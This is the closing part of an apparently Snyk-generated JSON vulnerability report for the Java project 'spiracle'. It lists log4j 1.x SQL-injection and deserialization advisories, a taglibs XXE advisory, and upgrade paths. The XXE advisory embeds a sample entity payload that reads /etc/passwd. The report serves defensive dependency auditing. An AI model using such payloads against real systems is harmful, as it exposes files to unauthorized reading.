        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "alternativeIds": [],
        "creationTime": "2022-01-18T17:06:29.378900Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 8.1,
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to SQL Injection. By design, the `JDBCAppender` in Log4j 1.2.x accepts an SQL statement as a configuration parameter where the values to be inserted are converters from `PatternLayout`. The message converter, `%m`, is likely to always be included. This allows attackers to manipulate the SQL by entering crafted strings into input fields or headers of an application that are logged allowing unintended SQL queries to be executed.\r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use the `JDBCAppender`, which is not the default. \r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions. Beginning in version 2.0-beta8, the `JDBCAppender` was re-introduced with proper support for parameterized SQL queries and further customization over the columns written to in logs.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n",
        "disclosureTime": "2022-01-18T17:01:37Z",
        "exploit": "Not Defined",
        "fixedIn": [],
        "functions": [],
        "functions_new": [],
        "id": "SNYK-JAVA-LOG4J-2342645",
        "identifiers": {
          "CVE": [
            "CVE-2022-23305"
          ],
          "CWE": [
            "CWE-89"
          ]
        },
        "language": "java",
        "malicious": false,
        "mavenModuleName": {
          "artifactId": "log4j",
          "groupId": "log4j"
        },
        "modificationTime": "2022-01-18T17:13:25.423081Z",
        "moduleName": "log4j:log4j",
        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2022-01-18T17:13:25.563591Z",
        "references": [
          {
            "title": "Apache Mailing List",
            "url": "https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y"
          },
          {
            "title": "Apache Security Advisory",
            "url": "https://logging.apache.org/log4j/1.2/index.html"
          }
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "severity": "high",
        "socialTrendAlert": true,
        "title": "SQL Injection",
        "from": [
          "com.waratek:spiracle@1.4.0",
          "log4j:log4j@1.2.16"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.16",
        "severityWithCritical": "high"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "alternativeIds": [],
        "creationTime": "2022-01-18T17:08:37.955423Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 8.1,
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. CVE-2020-9493 identified a deserialization issue that was present in Apache Chainsaw. Prior to Chainsaw V2.0 Chainsaw was a component of Apache Log4j 1.2.x where the same issue exists.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [NVD Information](https://nvd.nist.gov/vuln/detail/CVE-2020-9493)\n",
        "disclosureTime": "2022-01-18T17:06:32Z",
        "exploit": "Not Defined",
        "fixedIn": [],
        "functions": [],
        "functions_new": [],
        "id": "SNYK-JAVA-LOG4J-2342646",
        "identifiers": {
          "CVE": [
            "CVE-2022-23307"
          ],
          "CWE": [
            "CWE-502"
          ]
        },
        "language": "java",
        "malicious": false,
        "mavenModuleName": {
          "artifactId": "log4j",
          "groupId": "log4j"
        },
        "modificationTime": "2022-01-18T17:13:25.244196Z",
        "moduleName": "log4j:log4j",
        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2022-01-18T17:13:25.403564Z",
        "references": [
          {
            "title": "Apache Mailing List",
            "url": "https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh"
          },
          {
            "title": "Apache Security Advisory",
            "url": "https://logging.apache.org/log4j/1.2/index.html"
          },
          {
            "title": "NVD Information",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-9493"
          }
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "severity": "high",
        "socialTrendAlert": true,
        "title": "Deserialization of Untrusted Data",
        "from": [
          "com.waratek:spiracle@1.4.0",
          "log4j:log4j@1.2.16"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.16",
        "severityWithCritical": "high"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "alternativeIds": [],
        "creationTime": "2022-01-18T17:25:51.891230Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 8.1,
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. `JMSSink` in all versions of Log4j 1.x is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration or if the configuration references an LDAP service the attacker has access to. The attacker can provide a `TopicConnectionFactoryBindingName` configuration causing `JMSSink` to perform `JNDI` requests that result in remote code execution in a similar fashion to [`CVE-2021-4104`](https://security.snyk.io/vuln/SNYK-JAVA-LOG4J-2316893).  \r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use `JMSSink`, which is not the default.\r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n",
        "disclosureTime": "2022-01-18T17:22:50Z",
        "exploit": "Not Defined",
        "fixedIn": [],
        "functions": [],
        "functions_new": [],
        "id": "SNYK-JAVA-LOG4J-2342647",
        "identifiers": {
          "CVE": [
            "CVE-2022-23302"
          ],
          "CWE": [
            "CWE-502"
          ]
        },
        "language": "java",
        "malicious": false,
        "mavenModuleName": {
          "artifactId": "log4j",
          "groupId": "log4j"
        },
        "modificationTime": "2022-01-18T17:28:19.186551Z",
        "moduleName": "log4j:log4j",
        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2022-01-18T17:28:19Z",
        "references": [
          {
            "title": "Apache Mailing List",
            "url": "https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w"
          },
          {
            "title": "Apache Security Advisory",
            "url": "https://logging.apache.org/log4j/1.2/index.html"
          }
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "severity": "high",
        "socialTrendAlert": true,
        "title": "Deserialization of Untrusted Data",
        "from": [
          "com.waratek:spiracle@1.4.0",
          "log4j:log4j@1.2.16"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.16",
        "severityWithCritical": "high"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
        "alternativeIds": [],
        "creationTime": "2020-06-18T15:47:31.144561Z",
        "credit": [
          "Marcio Almeida de Macedo"
        ],
        "cvssScore": 9.8,
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. Included in Log4j 1.2 is a SocketServer class that is vulnerable to deserialization of untrusted data which can be exploited to remotely execute arbitrary code when combined with a deserialization gadget when listening to untrusted network traffic for log data.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E)\n- [PoC](https://0xsapra.github.io/website/CVE-2019-17571)\n",
        "disclosureTime": "2019-12-22T09:33:11Z",
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "functions": [
          {
            "functionId": {
              "className": "SocketServer",
              "filePath": "org/apache/log4j/net/SocketServer.java",
              "functionName": "main"
            },
            "version": [
              "[0,]"
            ]
          }
        ],
        "functions_new": [
          {
            "functionId": {
              "className": "org.apache.log4j.net.SocketServer",
              "functionName": "main"
            },
            "version": [
              "[0,]"
            ]
          }
        ],
        "id": "SNYK-JAVA-LOG4J-572732",
        "identifiers": {
          "CVE": [
            "CVE-2019-17571"
          ],
          "CWE": [
            "CWE-502"
          ],
          "GHSA": [
            "GHSA-2qrg-x229-3v8q"
          ]
        },
        "language": "java",
        "malicious": false,
        "mavenModuleName": {
          "artifactId": "log4j",
          "groupId": "log4j"
        },
        "modificationTime": "2021-01-24T09:35:02.800085Z",
        "moduleName": "log4j:log4j",
        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2020-06-19T09:33:01Z",
        "references": [
          {
            "title": "Apache Security Advisory",
            "url": "https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E"
          },
          {
            "title": "PoC",
            "url": "https://0xsapra.github.io/website/CVE-2019-17571"
          }
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "severity": "critical",
        "socialTrendAlert": false,
        "title": "Deserialization of Untrusted Data",
        "from": [
          "com.waratek:spiracle@1.4.0",
          "log4j:log4j@1.2.16"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.16",
        "severityWithCritical": "critical"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
        "alternativeIds": [],
        "creationTime": "2017-02-22T07:28:31.886000Z",
        "credit": [
          "David Jorm"
        ],
        "cvssScore": 7.3,
        "description": "## Overview\n[taglibs:standard](https://tomcat.apache.org/download-taglibs.cgi) is an implementation of the JSP Standard Tag Library (JSTL) specification.\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection. Apache Standard Taglibs before 1.2.3 allows remote attackers to execute arbitrary code or conduct external XML entity (XXE) attacks via a crafted XSLT extension in a `<x:parse>` or `<x:transform>` JSTL XML tag.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nUpgrade `taglibs:standard` to version 1.2.3 or higher.\n## References\n- [Apache Mail Archive](http://mail-archives.us.apache.org/mod_mbox/www-announce/201502.mbox/%3C82207A16-6348-4DEE-877E-F7B87292576A@apache.org%3E)\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0254)\n- [RedHat CVE Database](https://access.redhat.com/security/cve/CVE-2015-0254)\n",
        "disclosureTime": "2015-02-27T16:13:27Z",
        "exploit": "Not Defined",
        "fixedIn": [
          "1.2.3"
        ],
        "functions": [],
        "functions_new": [],
        "id": "SNYK-JAVA-TAGLIBS-31357",
        "identifiers": {
          "CVE": [
            "CVE-2015-0254"
          ],
          "CWE": [
            "CWE-94"
          ],
          "GHSA": [
            "GHSA-6x4w-8w53-xrvv"
          ]
        },
        "language": "java",
        "malicious": false,
        "mavenModuleName": {
          "artifactId": "standard",
          "groupId": "taglibs"
        },
        "modificationTime": "2020-06-12T14:36:56.185972Z",
        "moduleName": "taglibs:standard",
        "packageManager": "maven",
        "packageName": "taglibs:standard",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2015-02-27T16:51:55Z",
        "references": [
          {
            "title": "Apache Mail Archive",
            "url": "http://mail-archives.us.apache.org/mod_mbox/www-announce/201502.mbox/%3C82207A16-6348-4DEE-877E-F7B87292576A@apache.org%3E"
          },
          {
            "title": "NVD",
            "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0254"
          },
          {
            "title": "RedHat CVE Database",
            "url": "https://access.redhat.com/security/cve/CVE-2015-0254"
          }
        ],
        "semver": {
          "vulnerable": [
            "[,1.2.3)"
          ]
        },
        "severity": "high",
        "socialTrendAlert": false,
        "title": "XML External Entity (XXE) Injection",
        "from": [
          "com.waratek:spiracle@1.4.0",
          "taglibs:standard@1.1.2"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "taglibs:standard",
        "version": "1.1.2",
        "severityWithCritical": "high"
      }
    ],
    "upgrade": {
      "com.mchange:c3p0@0.9.2.1": {
        "upgradeTo": "com.mchange:c3p0@0.9.5.4",
        "upgrades": [
          "com.mchange:c3p0@0.9.2.1",
          "com.mchange:c3p0@0.9.2.1"
        ],
        "vulns": [
          "SNYK-JAVA-COMMCHANGE-174481",
          "SNYK-JAVA-COMMCHANGE-451675"
        ]
      },
      "commons-collections:commons-collections@3.2": {
        "upgradeTo": "commons-collections:commons-collections@3.2.2",
        "upgrades": [
          "commons-collections:commons-collections@3.2",
          "commons-collections:commons-collections@3.2"
        ],
        "vulns": [
          "SNYK-JAVA-COMMONSCOLLECTIONS-30078",
          "SNYK-JAVA-COMMONSCOLLECTIONS-472711"
        ]
      },
      "commons-fileupload:commons-fileupload@1.3": {
        "upgradeTo": "commons-fileupload:commons-fileupload@1.3.3",
        "upgrades": [
          "commons-fileupload:commons-fileupload@1.3",
          "commons-fileupload:commons-fileupload@1.3",
          "commons-fileupload:commons-fileupload@1.3",
          "commons-fileupload:commons-fileupload@1.3",
          "commons-fileupload:commons-fileupload@1.3"
        ],
        "vulns": [
          "SNYK-JAVA-COMMONSFILEUPLOAD-30401",
          "SNYK-JAVA-COMMONSFILEUPLOAD-30082",
          "SNYK-JAVA-COMMONSFILEUPLOAD-31540",
          "SNYK-JAVA-COMMONSFILEUPLOAD-30080",
          "SNYK-JAVA-COMMONSFILEUPLOAD-30081"
        ]
      },
      "mysql:mysql-connector-java@5.1.34": {
        "upgradeTo": "mysql:mysql-connector-java@8.0.28",
        "upgrades": [
          "mysql:mysql-connector-java@5.1.34",
          "mysql:mysql-connector-java@5.1.34",
          "mysql:mysql-connector-java@5.1.34",
          "mysql:mysql-connector-java@5.1.34",
          "mysql:mysql-connector-java@5.1.34",
          "mysql:mysql-connector-java@5.1.34",
          "mysql:mysql-connector-java@5.1.34",
          "mysql:mysql-connector-java@5.1.34"
        ],
        "vulns": [
          "SNYK-JAVA-MYSQL-2386864",
          "SNYK-JAVA-MYSQL-1766958",
          "SNYK-JAVA-MYSQL-174574",
          "SNYK-JAVA-MYSQL-451464",
          "SNYK-JAVA-MYSQL-31449",
          "SNYK-JAVA-MYSQL-31580",
          "SNYK-JAVA-MYSQL-31399",
          "SNYK-JAVA-MYSQL-451460"
        ]
      },
      "org.springframework:spring-context@3.2.13.RELEASE": {
        "upgradeTo": "org.springframework:spring-context@3.2.14.RELEASE",
        "upgrades": [
          "org.springframework:spring-context@3.2.13.RELEASE"
        ],
        "vulns": [
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-31323"
        ]
      },
      "org.springframework:spring-core@3.2.13.RELEASE": {
        "upgradeTo": "org.springframework:spring-core@5.2.19.RELEASE",
        "upgrades": [
          "org.springframework:spring-core@3.2.13.RELEASE",
          "org.springframework:spring-core@3.2.13.RELEASE",
          "org.springframework:spring-core@3.2.13.RELEASE"
        ],
        "vulns": [
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-2330878",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-2329097",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-31326"
        ]
      }
    },
    "patch": {},
    "ignore": {},
    "pin": {}
  },
  "filesystemPolicy": false,
  "filtered": {
    "ignore": [],
    "patch": []
  },
  "uniqueCount": 30,
  "projectName": "com.waratek:spiracle",
  "displayTargetFile": "pom.xml",
  "path": "/Users/admin/Downloads/spiracle/spiracle"
}
